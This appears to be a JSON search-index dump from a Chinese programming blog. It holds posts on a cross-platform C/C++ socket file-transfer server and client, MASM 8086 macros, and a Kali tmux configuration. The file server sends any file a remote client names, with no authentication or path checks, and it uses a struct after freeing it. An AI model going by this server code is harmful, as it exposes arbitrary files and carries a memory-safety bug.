\u0026#34; \u0026lt;\u0026lt; path \u0026lt;\u0026lt; std::endl; // 声明局部变量 char buf[1024] { 0 }; #ifdef _WIN32 struct WSAData wsa; SOCKET fd; // 初始化套接字库 WSAStartup(MAKEWORD(2, 2), \u0026amp;wsa); #else int fd; #endif // TODO 建立套接字 #ifdef _WIN32 CKEX((fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET); #else CKE(fd = socket(AF_INET, SOCK_STREAM, 0)); #endif // _WIN32 // TODO 建立连接 // 设置服务器地址、端口 struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_port = htons(port); inet_pton(AF_INET, IP.c_str(), \u0026amp;(server_addr.sin_addr)); CKEX(connect(fd, (struct sockaddr*)\u0026amp;server_addr, sizeof(server_addr))); // TODO send \u0026amp; recv int num = fname.size(); send(fd, fname.c_str(), sizeof(char) * fname.size(), 0); std::ofstream outFile(path, std::ios::out | std::ios::binary); struct timeval timeout; timeout.tv_sec = 2; timeout.tv_usec = 0; fd_set read_fds; FD_ZERO(\u0026amp;read_fds); FD_SET(fd, \u0026amp;read_fds); while (true) { int result = select(fd + 1, \u0026amp;read_fds, NULL, NULL, \u0026amp;timeout); if (result == -1) { std::cerr \u0026lt;\u0026lt; \u0026#34;[EXIT ERROR] select() raise error: \u0026#34; \u0026lt;\u0026lt; strerror(errno) \u0026lt;\u0026lt; std::endl; exit(127 + errno); } else if (result == 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;Timeout waiting for data.\u0026#34; \u0026lt;\u0026lt; std::endl; break; } int received = recv(fd, buf, sizeof(buf)-1, 0); if (received == 0) { std::cout \u0026lt;\u0026lt; \u0026#34;the server has ended its service...\\n\u0026#34; \u0026lt;\u0026lt; \u0026#34;check your file (\u0026#34; \u0026lt;\u0026lt; path \u0026lt;\u0026lt; \u0026#34;) to find out if it went well...\u0026#34; \u0026lt;\u0026lt; std::endl; break; } else if (received == -1){ std::cerr \u0026lt;\u0026lt; \u0026#34;[EXIT ERROR] recv() raise error: \u0026#34; \u0026lt;\u0026lt; strerror(errno) \u0026lt;\u0026lt; std::endl; exit(127 + errno); } else{ outFile.write(buf, sizeof(char)*received); std::cout.write(buf, sizeof(char)*received); } } std::cout \u0026lt;\u0026lt; \u0026#34;Transformation Done!\u0026#34; \u0026lt;\u0026lt; std::endl; outFile.close(); // TODO 关闭连接 #ifdef _WIN32 closesocket(fd); // 注销Winsock相关库 WSACleanup(); #else close(fd); #endif return 0; } ","date":"2023年06月09日","permalink":"https://peterliuzhi.top/posts/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95cc++%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%94%A8c++%E6%A0%87%E5%87%86%E7%BA%BF%E7%A8%8B%E5%BA%93%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%B9%B3%E5%8F%B0/","section":"posts","summary":"The only real mistake is the one from which we learn nothing. — John Powell 引入 在【学习记录】C\u0026amp;C++网络编程——文件传输（兼容Windows和Linux） - P3troL1er 的个人博客我提到兼容Win","tags":["杂谈"],"title":"【学习记录】C\u0026C++网络编程——用C++标准线程库实现跨平台"},{"categories":["posts","汇编"],"contents":" People usually compare the computer to the head of the human being. I would say that hardware is the bone of the head, the skull. The semiconductor is the brain within the head. The software is the wisdom. And data is the knowledge. — Masayoshi Son\n引入 最近在写汇编语言大作业，因为老师讲了一些汇编宏的用法，让我大为新奇，于是在大作业里面普遍用到了宏，在这里记录一下\n另外，教学中用的masm好像比较老旧，很多语法都支持不了（是masm自己的原因吗，好像不支持leave指令，不过我用宏自己定义了一个），很多网上搜到的高级宏用法都用不了，所以这里分享的内容其实离我的想象还有一段距离，也算是一种遗憾吧\n宏的基本知识 无参数宏 类似于C语言中的宏常量的真子集（不包括宏定义的常量数字等），如下定义：\n\u0026lt;宏名\u0026gt; macro ... endm 会直接把宏名替换为里面的内容，由此可以实现leave指令：\nleave macro mov sp, bp pop bp endm 同时也可以定义一下进入函数时的准备工作：\nintofunc macro push bp mov bp, sp endm 有参数宏 类似于C语言中的宏函数：\n\u0026lt;宏名\u0026gt; macro \u0026lt;参数1\u0026gt;, \u0026lt;参数2\u0026gt;, \u0026lt;参数3\u0026gt;, ... ... endm 类似于C语言中：\n#define \u0026lt;宏名\u0026gt;(\u0026lt;参数1\u0026gt;, \u0026lt;参数2\u0026gt;, \u0026lt;参数3\u0026gt;, ...) ... 不过在我所使用的这个版本的masm中好像不支持变参宏\n\u0026lt;\u0026gt;操作符 把尖括号内的看作一个整体把一个完整的实参括起来，成为一个新的实参，比如：\nmymacro \u0026lt;offset mydata\u0026gt; 其中把offset mydata作为一个整体传给了mymacro\n在C语言中没有对应的操作符，硬说只能是括号\n\u0026amp;操作符 表示拼接，意同C语言中的##，例如：\nshift_var marco r_m,direct,count mov cl,count s\u0026amp;direct r_m,cl endm 其中把s和direct所代表的文本拼接在了一起\n%操作符 告诉宏汇编程序获取表达式的值，而不是获取表达式文本本身，一般用于给宏传递实参（宏调用），但有些情况不能用，要确保%后面是一个编译期表达式\n!操作符、;;注解符 !表示后面的操作符不是操作符而是普通的字符\n;;表示宏中的注解，宏不会把这段注解展开（只使用;，预处理后的代码中会多出注解）\n文本替换宏 在新版的masm中好像有TEXTEQU指令，但是在我的masm中只有EQU指令\n它可以实现C语言中的宏常量变量，也可以简单地用于替换一段文本\ncall_print EQU \u0026lt;func1 print\u0026gt; STACK_SIZE EQU 1024 local伪指令 在宏定义中使用变量名和标号，为了避免在宏展开时产生多个相同的变量名或标号（比如有时候会在宏中定义循环和跳转）\n宏展开时，local伪指令指定的变量、标号自动生成格式为??ⅩⅩⅩⅩ的符号，其中后四位顺序使用0000～FFFF的十六进制数字。\ndelay macro reg ;; reg为16位寄存器 local lop mov cx,reg lop: nop loop lop endm 宏嵌套 可以使用一个宏生成另一个宏的定义，这样就可以定义一个生成器，然后通过给这个宏传不同的参数，从而批量生成宏\n重复汇编 可以使用rept指令来重复生成一段汇编，将重复语句序列重复汇编，表达式的值为重复汇编的次数。也可以重复生成一段宏。\nrept 表达式 ... endm 【例】用重复汇编可以在9*9个字节存储单元中存放一个乘法九九表的数值：\nn=0 rept 9 n=n+1 m=0 rept 9 m=m+1 db n*m endm endm irp指令将重复语句序列重复汇编，次数由实参个数所决定\nirp 形参，\u0026lt;实参1，实参2,……\u0026gt; ... endm pushreg macro text irp reg,\u0026lt;text\u0026gt; push reg endm endm irpc指令将重复语句序列重复汇编，次数由字符串中字符个数决定\nirpc 形参，字符串 ... endm 条件汇编 宏汇编提供了十种条件宏汇编伪操作指令：if、ife、if1、if2、ifdef、ifndef、ifb、ifnb、ifidn、ifdif\nif: 当表达式的值不为零，则条件为真； ife:如果表达式的值为零，则条件为真； if1: 如果是第一遍扫描，则条件为真； if2：如果是第二遍扫描，则条件为真； ifdef：表达式为符号。如果该符号已经定义，则条件为真。 ifndef:表达式为符号。如果符号没有定义，则条件为真。 ifb \u0026lt;count\u0026gt;：如果尖括号中为空，则条件为真。 ifnb \u0026lt;count\u0026gt;:如果尖括号中不为空，则条件为真。 ifidn \u0026lt;char1\u0026gt;, \u0026lt;char2\u0026gt;：如果两个字符串相同则条件为真 ifidf \u0026lt;char1\u0026gt;, \u0026lt;char2\u0026gt;：如果两个字符串不同则条件为真。 使用语法：\nifx ×× 表达式 ... else ... endif 类似于C语言中的#if、#endif、#ifdef、#ifndef等\n宏魔法实例 x86风格函数传参 pusharg macro val mov ax, val push ax endm 类C函数原型声明 func0 macro funcname call funcname endm func1 macro funcname, v1 mov ax, v1 push ax ; pusharg v1 call funcname add sp, 2 endm func2 macro funcname, v1, v2 mov ax, v2 push ax mov ax, v1 push ax call funcname add sp, 4 endm func3 macro funcname, v1, v2, v3 mov ax, v3 push ax mov ax, v2 push ax mov ax, v1 push ax call funcname add sp, 6 endm call_print EQU \u0026lt;func1 print\u0026gt; call_puts EQU \u0026lt;func1 puts\u0026gt; call_putchar EQU \u0026lt;func1 putchar\u0026gt; call_read EQU \u0026lt;func3 read\u0026gt; call_strlen EQU \u0026lt;func1 strlen\u0026gt; call_strcmp EQU \u0026lt;func2 strcmp\u0026gt; call_itoa EQU \u0026lt;func2 itoa\u0026gt; call_atoi EQU \u0026lt;func1 atoi\u0026gt; call_getchar EQU \u0026lt;func0 getchar\u0026gt; call_getint EQU \u0026lt;func0 getint\u0026gt; call_memset EQU \u0026lt;func3 memset\u0026gt; call_memcpy EQU \u0026lt;func3 memcpy\u0026gt; call_swap EQU \u0026lt;func2 swap\u0026gt; call_gets macro v1, v2, v3 mov ax, v3 push ax mov ax, v2 push ax mov ax, v1 push ax call read add sp, 6 mov byte ptr ds:[di], 0 endm 使用的时候的示例：\ncall_print \u0026lt;offset change_index_st\u0026gt; call_gets \u0026lt;offset search_key_st\u0026gt;, \u0026lt;offset buffer\u0026gt;, STU_NAME_SIZE 在函数中取形参 这里我使用的是x86风格传参，因此参数都保存在栈中\narg macro i arg\u0026amp;i macro reg mov reg, [bp+2*(i+1)] endm endm ; 声明arg1~arg7 n=0 rept 7 n=n+1 arg %n endm 使用的时候，比如read有三个参数：\n; read(read_instruction, read_storage, read_size) read: intofunc arg1 ax ... arg2 di ... arg3 cx ... leave ret 而且只要不更改bp下面（地址上是上面）的栈，在函数任意位置都能取参\n进入函数与退出函数 上面已经说过了\nintofunc macro push bp mov bp, sp endm leave macro mov sp, bp pop bp endm 初始化程序与结束程序 这个比较简单，就普通的替换\nprog_initailize macro mov ax, data mov ds, ax mov ax, 0B800H mov es, ax ;; mov ax, stack ;; mov ss, ax ;; mov sp, STACK_SIZE mov bp, sp xor di, di xor si, si xor ax, ax xor bx, bx xor cx, cx xor dx, dx endm prog_doom macro mov ax, 4c00h int 21h endm 在全局变量保存寄存器 有时候我们不想用复杂的栈操作，在保证函数内嵌套调用的函数不会破坏全局变量的前提下，可以在全局变量暂存寄存器。对每个寄存器都有一个暂时的存储空间：\nsave macro reg mov storage_\u0026amp;reg, reg endm load macro reg mov reg, storage_\u0026amp;reg endm 然后在数据段声明：\nstorage_di dw 0 storage_si dw 0 storage_bx dw 0 storage_ax dw 0 storage_cx dw 0 storage_dx dw 0 只要数据段的相应标号存在，save和load就能起效\n宏常量声明 很简单的类似#define的声明\nSTACK_SIZE EQU 1024 STU_NAME_SIZE EQU 20h STU_NUMBER_SIZE EQU 15 STU_COUNT EQU 10 CONTINUE_COUNT EQU 3 SCORE_COUNT EQU 2 ","date":"2023年06月08日","permalink":"https://peterliuzhi.top/posts/8086-masm6.1119811988%E5%AE%8F%E9%AD%94%E6%B3%95dosbox%E4%B8%8B/","section":"posts","summary":"People usually compare the computer to the head of the human being. I would say that hardware is the bone of the head, the skull. The semiconductor is the brain within the head. The software is the wisdom. And data is the knowledge. — Masayoshi Son 引入 最近在写汇编语言大作业，因为老师讲了一些汇编宏的用法，","tags":["masm","8086实模式","宏"],"title":"8086 masm6.11（1981，1988）宏魔法（dosbox下）"},{"categories":["posts"],"contents":"本文转载自kali tmux 配置和优化 | 是我 の blog，敬请关注并支持原作者是我 の blog！\nChange your thoughts and you change your world. — Norman Vincent Peale\n前言 今天看了个渗透比赛的视频 看起来很多终端用起来很爽又很方便 查了一下是个叫做 tmux 的工具 也整一个~\n下载 tmux kali 自带 但是还是放一个下载的方式\nsudo apt-get install tmux 然后就好了\n优化 tmux 参考1 参考2\n首先提示！！！ kali 里面跟网上很多是mac等系统就是 linux 的不一样\n很多配置好的是弄不了或者很麻烦 就没有必要了 毕竟实用最重要 加一点点美化就行了\n这是我的配置文件 可以直接复制到 ~/.tmux.config 下然后就可以了\ntmux 会自动识别这个文件作为配置文件\nset -g prefix C-f unbind C-b # C-b 即 Ctrl+b 键，unbind 意味着解除绑定 bind C-f send-prefix # 绑定 Ctrl+f 为新的指令前缀 # 从tmux v1.6版起，支持设置第二个指令前缀 set-option -g prefix2 ` # 设置一个不常用的`键作为指令前缀，按键更快些 # 添加加载配置文件快捷指令 r bind r source-file ~/.tmux.conf \\; display-message \u0026#34;Config reloaded..\u0026#34; # v2.1及以上的版本支持鼠标 set-option -g mouse on # 更改新增面板键 unbind \u0026#39;\u0026#34;\u0026#39; bind - splitw -v -c \u0026#39;#{pane_current_path}\u0026#39; # 垂直方向新增面板，默认进入当前目录 unbind % bind = splitw -h -c \u0026#39;#{pane_current_path}\u0026#39; # 水平方向新增面板，默认进入当前目录 # 设置窗口面板起始序号 set -g base-index 1 # 设置窗口的起始下标为1 set -g pane-base-index 1 # 设置面板的起始下标为1 # 自定义状态栏（还可以优化 慢慢来） # set -g status-utf8 on # 状态栏支持utf8 这个kali不支持 就算了 set -g status-interval 1 # 状态栏刷新时间 set -g status-justify left # 状态栏列表左对齐 setw -g monitor-activity on # 非当前窗口有内容更新时在状态栏通知 set -g status-bg black # 设置状态栏背景黑色 set -g status-fg yellow # 设置状态栏前景黄色 set -g status-style \u0026#34;bg=black, fg=yellow\u0026#34; # 状态栏前景背景色 set -g status-left \u0026#34;#[bg=#FF661D] ❐ #S \u0026#34; # 状态栏左侧内容 set -wg window-status-format \u0026#34; #I #W \u0026#34; # 状态栏窗口名称格式 set -wg window-status-current-format \u0026#34; #I:#W#F \u0026#34; # 状态栏当前窗口名称格式(#I：序号，#w：窗口名称，#F：间隔符) set -wg window-status-separator \u0026#34;\u0026#34; # 状态栏窗口名称之间的间隔 set -wg window-status-current-style \u0026#34;bg=red\u0026#34; # 状态栏当前窗口名称的样式 set -wg window-status-last-style \u0026#34;fg=red\u0026#34; # 状态栏最后一个窗口名称的样式 set -g message-style \u0026#34;bg=#202529, fg=#91A8BA\u0026#34; # 指定消息通知的前景、后景色 # 复制模式更改为 vi 风格 setw -g mode-keys vi # 开启vi风格后，支持vi的C-d、C-u、hjkl等快捷键 # 复制模式向 vi 靠拢 bind -T copy-mode-vi v send-keys -X begin-selection # 绑定v键为开始选择文本 bind -T copy-mode-vi y send-keys -X copy-selection-and-cancel # 绑定y键为复制选中文本 bind p pasteb # 绑定p键为粘贴文本（p键默认用于进入上一个窗口，不建议覆盖） # tmux默认会自动重命名窗口，频繁的命令行操作，将频繁触发重命名，比较浪费CPU性能，性能差的计算机上，问题可能更为明显。建议添加如下配置关闭rename机制 setw -g automatic-rename off setw -g allow-rename off 其实支持鼠标已经基本无敌\n比如你右键就可以直接看到一个菜单 可以直接进行 split kill zoom甚至可以直接拖动分好的边界直接进行移动了 最重要的是可以用滚轮上下滑动了！！！\n这是实际效果\n快捷键等 这里就放一个网站呗 这个\n快捷键之类的可以自己记 或者用 \u0026lt;prefix\u0026gt; + ? 来查看 list （鼠标真方便嘻嘻）\n","date":"2023年06月07日","permalink":"https://peterliuzhi.top/posts/kali-tmux-%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BC%98%E5%8C%96/","section":"posts","summary":"本文转载自kali tmux 配置和优化 | 是我 の blog，敬请关注并支持原作者是我 の blog！ Change your thoughts and you change your world. — Norman Vincent Peale 前言 今天看了个渗透比赛的视频 看起来很多终端","tags":["kali","tmux"],"title":"kali tmux 配置和优化"},{"categories":["posts","开发","C/C++网络编程"],"contents":" In the depth of winter, I finally learned that there was within me an invincible summer. — Albert Camus\n引入 之前在【学习记录】C\u0026amp;C++网络编程初步的时候写了如何初步通过socket api进行服务器和客户端之间的通信，于是我就想，能不能做一个文件传输系统，客户端发送给服务器一个文件路径，然后服务器在自己的系统上打开然后输出给客户端？就类似于scp那样的。\n同时这个文件传输系统必须同时在Linux和Windows上兼容，因为很多情况下人们测试是在Windows上打开Linux虚拟机进行测试的。做到这一点可以使用宏控制，但是会比较麻烦，我决定将来要用C++标准库重写一遍。\n基本原理 在客户端的shell中通过命令行参数指定IP地址、port和主机系统文件路径，然后通过IP:port连接服务器，再将主机系统文件路径传递给服务器，然后服务器在自己的系统上打开文件并传输给客户端，同时客户端使用select（IO多路转接）检测在一定时间内是否还有接收，如果超时则停止。\n如何与Windows兼容 代码能使用C标准库就使用标准库（比如Windows上没有open/read/write而是另一套API，这时我选择标准输入输出流），尽量不使用外部第三方库（比如我先在Linux上用pthread写了服务器，虽然Windows上也有第三方pthread库，但是尽量不使用），使用宏控制代码生成：\n#ifdef _WIN32 ... #else ... #endif 同时CMakeLists.txt也对两个平台进行适配：\ncmake_minimum_required(VERSION 3.25) set(CMAKE_C_STANDARD 11) set(CMAKE_CXX_STANDARD 17) project(cweb) set(EXECUTABLE_OUTPUT_PATH ${CMAKE_SOURCE_DIR}/bin) add_executable(file_client file_client.c) add_executable(file_server file_server.c) if(CMAKE_HOST_SYSTEM_NAME MATCHES \u0026#34;Windows\u0026#34;) target_link_libraries(file_client PRIVATE wsock32) target_link_libraries(file_client PRIVATE Ws2_32) target_link_libraries(file_server PRIVATE wsock32) target_link_libraries(file_server PRIVATE Ws2_32) endif(CMAKE_HOST_SYSTEM_NAME \u0026#34;Windows\u0026#34;) 如何确定服务器和客户端的IP和port 服务器的IP不用指定，但是port可以通过命令行指定，如不指定则默认端口为10000\n客户端通过命令行参数指定IP:port，其第一个命令行参数可以是\u0026quot;127.0.0.1\u0026quot;这种不带port的（默认port为10000），也可以是\u0026quot;127.0.0.1:12345\u0026quot;这种加一个冒号后面跟port的\n完整代码 服务器 #ifdef _WIN32 #define _CRT_SECURE_NO_WARNINGS #endif #include \u0026lt;errno.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; // ---web--- #ifdef _WIN32 #include \u0026lt;winsock2.h\u0026gt; #include \u0026lt;ws2tcpip.h\u0026gt; // --- windows.h要求要在winsock2.h下面，为防止格式化程序更换次序所以加注释隔开 #include \u0026lt;windows.h\u0026gt; #pragma comment(lib, \u0026#34;ws2_32.lib\u0026#34;) #else #include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #endif // 几个宏用来防止手动写入过多错误判断代码 #define CKEX(EXP) \\ do { \\ if ((EXP)) { \\ fprintf(stderr, \u0026#34;[EXIT ERROR] %s raise error: %s\\n\u0026#34;, #EXP, strerror(errno)); \\ exit(127 + errno); \\ } \\ } while (0) #define CKE(EXP) CKEX((EXP) == -1) #define CKEN(EXP) CKEX((EXP) != 0) #define CKEZ(EXP) CKEX((EXP) == 0) // 用来保存通信线程所需的相关信息 typedef struct { #ifdef _WIN32 SOCKET cfd; #else int cfd; // 通信的文件描述符 #endif // _WIN32 struct sockaddr_in details; // 客户端的相关信息 socklen_t details_len; // 上面那个结构体的长度，如果通信线程调用recvfrom就可以用到 char ip[16]; // 保存客户端的IP字符串 int port; // 保存客户端的端口 #ifdef _WIN32 DWORD tid; #else pthread_t tid; #endif // _WIN32 } netfd; #ifdef _WIN32 static DWORD WINAPI communicate(void* arg) #else static void* communicate(void* arg) #endif // _WIN32 { // 通过强制转换 netfd* netinfo = (netfd*)arg; // 每个已连接的通信线程都有1kb的缓冲区 char fname[1024] = { 0 }; // 固定的回复 char response[1024] = { 0 }; // TODOrecv \u0026amp; send // 获取收到的字节数量 int len = recv(netinfo-\u0026gt;cfd, fname, sizeof(fname) - 1, 0); if (len \u0026gt; 0) { printf(\u0026#34;client from %s:%d ask for file: %s\\n\u0026#34;, netinfo-\u0026gt;ip, netinfo-\u0026gt;port, fname); long int num; FILE* fp = fopen(fname, \u0026#34;rb\u0026#34;); CKEX(fp == NULL); while ((num = fread(response, sizeof(char), sizeof(response)/sizeof(char)-1, fp)) \u0026gt; 0) { // response[status] = 0; send(netinfo-\u0026gt;cfd, response, sizeof(char) * num, 0); // #ifdef _WIN32 // Sleep(1000); // #else // sleep(1); // #endif // _WIN32 // Sleep(1000); } // puts(\u0026#34;b 1\u0026#34;); CKEN((!feof(fp)) \u0026amp;\u0026amp; ferror(fp)); if (fp != NULL){ fclose(fp); fp = NULL; } } else if (len == 0) { // TODO接收到客户端终止连接请求 puts(\u0026#34;the client has ended the connection...\u0026#34;); } else { // 接收到错误就打印出来，并且退出线程 fprintf(stderr, \u0026#34;[EXIT ERROR] %s raise error: %s\\n\u0026#34;, \u0026#34;recv()\u0026#34;, strerror(errno)); } printf(\u0026#34;exiting thread %ld (communication with %s:%d)...\u0026#34;, netinfo-\u0026gt;tid, netinfo-\u0026gt;ip, netinfo-\u0026gt;port); #ifdef _WIN32 CloseHandle((HANDLE)netinfo-\u0026gt;tid); #endif // _WIN32 free(netinfo); netinfo = NULL; #ifdef _WIN32 closesocket(netinfo-\u0026gt;cfd); return 0; #else close(netinfo-\u0026gt;cfd); pthread_exit((void*)0); #endif // _WIN32 } static void sig_int(int signo) { #ifdef _WIN32 printf(\u0026#34;thread %ld received: %s\\n\u0026#34;, GetCurrentThreadId(), _sys_errlist[signo]); #else printf(\u0026#34;thread %ld received: %s\\n\u0026#34;, pthread_self(), strsignal(signo)); #endif // _WIN32 puts(\u0026#34;server exiting...\u0026#34;); exit(signo); } int main(int argc, char const* argv[]) { int port = 10000; if (argc \u0026gt;= 2) { port = atoi(argv[1]); } // 声明局部变量 #ifdef _WIN32 SOCKET lfd; WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), \u0026amp;wsaData); HANDLE err; #else int lfd; pthread_attr_t tid_attr; int err; #endif // _WIN32 struct sockaddr_in server_addr; // 保存服务器的相关信息 const int connection_num = 8; // 设置最大连接数 // 设置信号处理函数 signal(SIGINT, sig_int); // TODO设置监听的套接字 // 设置TCP协议 CKE(lfd = socket(AF_INET, SOCK_STREAM, 0)); // TODO绑定端口 server_addr.sin_family = AF_INET; // from host byte order to network byte order server_addr.sin_port = htons(port); // 代表本机的任意地址 // 或者设置其中一个IP，使用inet_pton将IP地址字符串转换为二进制格式 // inet_pton - convert IPv4 and IPv6 addresses from text to binary form server_addr.sin_addr.s_addr = INADDR_ANY; CKEN(bind(lfd, (struct sockaddr*)\u0026amp;server_addr, sizeof(server_addr))); // TODO设置端口监听 CKEN(listen(lfd, connection_num)); #ifndef _WIN32 // 初始化线程属性，设置为线程启动即分离 CKEN((err = pthread_attr_init(\u0026amp;tid_attr))); CKEN((err = pthread_attr_setdetachstate(\u0026amp;tid_attr, PTHREAD_CREATE_DETACHED))); #endif //_WIN32 // TODO开始接收连接请求 // 阻塞直到有客户端连接 // 在栈空间中保存该结构体的大小，因为后面的api需要传指针进去，可能会更改这个值 // 不停地检测是否有连接 // 如果没有连接就阻塞 while (true) { // 这个结构体包括了传给线程的参数，因此不能是局部变量，可以在堆上分配 netfd* netinfo = (netfd*)malloc(sizeof(netfd)); netinfo-\u0026gt;details_len = sizeof(netinfo-\u0026gt;details); /** On success, these system calls return a file descriptor for the accepted socket (a nonnegative integer). On error, -1 is returned, errno is set appropriately, and addrlen is left unchanged. */ CKE(netinfo-\u0026gt;cfd = accept(lfd, (struct sockaddr*)\u0026amp;(netinfo-\u0026gt;details), \u0026amp;(netinfo-\u0026gt;details_len))); // 此时应该已经收到了客户端的相关信息 netinfo-\u0026gt;port = ntohs(netinfo-\u0026gt;details.sin_port); #ifdef _WIN32 inet_ntop(AF_INET, \u0026amp;(netinfo-\u0026gt;details.sin_addr), netinfo-\u0026gt;ip, netinfo-\u0026gt;details_len); #else inet_ntop(AF_INET, \u0026amp;(netinfo-\u0026gt;details.sin_addr.s_addr), netinfo-\u0026gt;ip, netinfo-\u0026gt;details_len); #endif // _WIN32 // 打印客户端相关信息 printf( \u0026#34;client\u0026#39;s IP: %s, port: %d\\n\u0026#34;, netinfo-\u0026gt;ip, netinfo-\u0026gt;port); // 创建信息 #ifdef _WIN32 CKEZ(err = CreateThread(NULL, 0, communicate, (LPVOID)netinfo, DETACHED_PROCESS, \u0026amp;netinfo-\u0026gt;tid)); // CloseHandle((HANDLE)tid); #else CKEN(err = pthread_create(\u0026amp;netinfo-\u0026gt;tid, \u0026amp;tid_attr, communicate, (void*)netinfo)); #endif // _WIN32 } // TODO关闭两个端口 // 在主线程只用关闭监听的文件描述符 #ifdef _WIN32 closesocket(lfd); WSACleanup(); #else close(lfd); #endif // _WIN32 return 0; } 客户端 #ifdef _WIN32 #define _CRT_SECURE_NO_WARNINGS #endif #include \u0026lt;errno.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #ifdef _WIN32 #include \u0026lt;winsock2.h\u0026gt; #include \u0026lt;ws2tcpip.h\u0026gt; // --- windows.h要求要在winsock2.h下面，为防止格式化程序更换次序所以加注释隔开 #include \u0026lt;windows.h\u0026gt; #pragma comment(lib, \u0026#34;ws2_32.lib\u0026#34;) #define REMOTE_PATH_SEP \u0026#39;/\u0026#39; #define LOCAL_PATH_SEP \u0026#39;\\\\\u0026#39; #else #include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #define REMOTE_PATH_SEP \u0026#39;\\\\\u0026#39; #define LOCAL_PATH_SEP \u0026#39;/\u0026#39; #endif #define CKEX(EXP) \\ do { \\ if ((EXP)) { \\ fprintf(stderr, \u0026#34;[EXIT ERROR] %s raise error: %s\\n\u0026#34;, #EXP, strerror(errno)); \\ exit(127 + errno); \\ } \\ } while (0) #define CKE(EXP) CKEX((EXP) == -1) #define CKEN(EXP) CKEX((EXP) != 0) #define CKEZ(EXP) CKEX((EXP) == 0) int main(int argc, char const* argv[]) { if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: %s \u0026lt;IP address[:port]\u0026gt; \u0026lt;filename\u0026gt;\u0026#34;, argv[0]); exit(127); } const char* IP = argv[1]; // 尝试从IP中分离出port char* port_str = strchr(IP, \u0026#39;:\u0026#39;); int port = 10000; if (port_str != NULL) { *port_str = 0; port_str++; port = atoi(port_str); } const char* fname = argv[2]; char* store_fname = strrchr(fname, REMOTE_PATH_SEP)+1; int path_ptr = 0; #ifdef _WIN32 char path[MAX_PATH] = { 0 }; path_ptr = MAX_PATH - strlen(store_fname) - 2; CKEZ(GetCurrentDirectory(path_ptr, path)); #else char path[PATH_MAX] = {0}; path_ptr = PATH_MAX - strlen(store_fname) - 2; CKEZ(getcwd(path, path_ptr)); #endif path_ptr = strlen(path); path[path_ptr++] = LOCAL_PATH_SEP; // puts(\u0026#34;b1\u0026#34;); strncpy(path + path_ptr, store_fname, strlen(store_fname) + 1); store_fname = path; printf(\u0026#34;Writing to %s\\n\u0026#34;, store_fname); // 声明局部变量 char buf[1024] = { 0 }; #ifdef _WIN32 struct WSAData wsa; SOCKET fd; // 初始化套接字库 WSAStartup(MAKEWORD(2, 2), \u0026amp;wsa); #else int fd; #endif // TODO 建立套接字 #ifdef _WIN32 CKEX((fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET); #else CKE(fd = socket(AF_INET, SOCK_STREAM, 0)); #endif // _WIN32 // TODO 建立连接 // 设置服务器地址、端口 struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_port = htons(port); inet_pton(AF_INET, IP, \u0026amp;(server_addr.sin_addr)); CKEX(connect(fd, (struct sockaddr*)\u0026amp;server_addr, sizeof(server_addr))); // TODO send \u0026amp; recv int num = strlen(fname); send(fd, fname, sizeof(char) * (num + 1), 0); FILE* fp = fopen(store_fname, \u0026#34;wb\u0026#34;); // 超时时间定为5秒 struct timeval timeout; timeout.tv_sec = 5; timeout.tv_usec = 0; // 设置监控的文件描述符集合 fd_set read_fds; FD_ZERO(\u0026amp;read_fds); FD_SET(fd, \u0026amp;read_fds); while (1) { int result = select(fd + 1, \u0026amp;read_fds, NULL, NULL, \u0026amp;timeout); if (result == -1) { fprintf(stderr, \u0026#34;[EXIT ERROR] %s raise error: %s\\n\u0026#34;, \u0026#34;select()\u0026#34;, strerror(errno)); exit(127 + errno); } else if (result == 0) { fprintf(stderr, \u0026#34;Timeout waiting for data.\\n\u0026#34;); break; } int received = recv(fd, buf, sizeof(buf)-1, 0); if (received == 0) { puts(\u0026#34;the server has ended its service...\u0026#34;); printf(\u0026#34;check your file (%s) to find out if it went well...\\n\u0026#34;, store_fname); break; } else if (received == -1){ fprintf(stderr, \u0026#34;[EXIT ERROR] %s raise error: %s\\n\u0026#34;, \u0026#34;recv()\u0026#34;, strerror(errno)); exit(127 + errno); } else{ fwrite(buf, sizeof(char), received, fp); fwrite(buf, sizeof(char), received, stdout); } } puts(\u0026#34;transformation done!\u0026#34;); fclose(fp); // TODO 关闭连接 #ifdef _WIN32 closesocket(fd); // 注销Winsock相关库 WSACleanup(); #else close(fd); #endif return 0; } ","date":"2023年06月05日","permalink":"https://peterliuzhi.top/posts/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95cc++%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%85%BC%E5%AE%B9windows%E5%92%8Clinux/","section":"posts","summary":"In the depth of winter, I finally learned that there was within me an invincible summer. — Albert Camus 引入 之前在【学习记录】C\u0026amp;C++网络编程初步的时候写了如何初步通过socket api进行服务器和客户端之","tags":["C/C++","网络编程","socket","套接字"],"title":"【学习记录】C\u0026C++网络编程——文件传输（兼容Windows和Linux）"},{"categories":["posts"],"contents":" Love has no age, no limit; and no death. — John 